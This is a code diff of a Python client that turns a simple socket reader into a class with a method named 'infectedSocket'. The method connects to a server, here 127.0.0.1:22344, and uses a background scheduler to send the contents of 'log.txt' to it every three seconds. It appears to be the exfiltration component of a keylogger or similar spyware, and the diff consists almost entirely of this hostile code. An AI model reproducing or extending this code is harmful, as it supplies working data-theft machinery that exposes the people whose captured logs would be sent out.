@@ -1,17 +1,50 @@
-import socket
+import os,socket,time
+from threading import Thread
+from apscheduler.schedulers.background import BackgroundScheduler
+
+class Client():
+
+    def __init__(self,lock):
+        self.BUFFER_SIZE = 1
+        self.filename = "log.txt"
+        self.filesize = os.path.getsize(self.filename)
+        self.lock = lock
+        self.sched = BackgroundScheduler()
+        self.infectedSocket()
+
+    def infectedSocket(self):
+        clt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        SERVER = '127.0.0.1'
+        PORT = 22344
+        clt.connect((SERVER, PORT))
+        #sendingThread = Thread(target = self.send_file, args = (clt,))
+        self.sched.add_job(self.send_file, 'interval', args=(clt,), seconds = 3)
+        self.sched.start()
+        
+    def send_file(self,s):
+
+        self.lock.acquire()
+        with open(self.filename, "r") as f:
+            assert self.BUFFER_SIZE > 0
+            total = 0
+  
+            for line in f:
+                s.send(bytes(line,"utf-8"))
+                total += len(line)
+                self.show_percentage(total/self.filesize)
+        
+        self.lock.release()
 
 
-def clientSocket():
+    def show_percentage(self,p):
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('127.0.0.1', 12346))
-    complete_info = ''
+        chops = 40
+        if p > 1 or p < 0:
+            print()
+            return
+        if p > 0.0:
+            print('\r', end = '')
 
-    while True:
-        msg = s.recv(4096)
-        if(len(msg) <= 0 or "STOPSEQUENCE" in msg.decode("utf-8")):
-            break
-        complete_info += msg.decode("utf-8")
-    print(complete_info)
+        s = int(p * chops)
+        print('[{}]  {:5.2f}%'.format('=' * max(0, s-1) + ('>' if s > 0 else '') + ' ' * (chops - s), p*100), end = ('\n' if p == 1.0 else ''))
 
-clientSocket()
